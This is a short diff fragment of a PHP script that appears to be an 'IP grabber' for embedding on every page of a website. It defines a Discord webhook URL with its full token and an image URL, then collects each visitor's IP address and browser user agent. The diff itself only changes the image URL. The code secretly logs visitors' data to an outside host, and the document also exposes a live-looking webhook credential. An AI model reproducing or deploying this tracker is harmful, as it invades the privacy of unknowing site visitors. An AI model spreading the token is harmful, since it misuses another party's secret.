@@ -13,7 +13,7 @@ NOTE: You can use this in every page if you make a it a external page and requir
 
         $webhookurl = "https://discord.com/api/webhooks/1540467897246416918/7nQNctoTYDgU-OGBr04bdhlKAzpnZ-86xX57bmYmq4HX7-ghS1T6Nu1gQty5SiDLBy8f";
         
- $image = "https://wallpapercave.com/wp/wp2654402.jpg";
+ $image = "https://i.pinimg.com/736x/cc/3b/c8/cc3bc856f0be0f0cf435b489df15b2d3.jpg";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
         $browser = $_SERVER['HTTP_USER_AGENT'];
